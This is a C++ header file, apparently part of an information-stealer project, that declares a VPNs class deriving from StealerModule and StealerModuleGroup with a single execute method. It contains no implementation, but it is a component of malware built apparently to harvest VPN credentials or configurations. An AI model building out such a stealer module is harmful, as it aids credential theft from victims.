//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_VPNS_H
#define STEALER_VPNS_H


#include "../../StealerModule.h"
#include "../../StealerModuleGroup.h"

class VPNs : public StealerModule, StealerModuleGroup {
public:
    VPNs();
    void execute(fs::path &root) override;
};


#endif //STEALER_VPNS_H
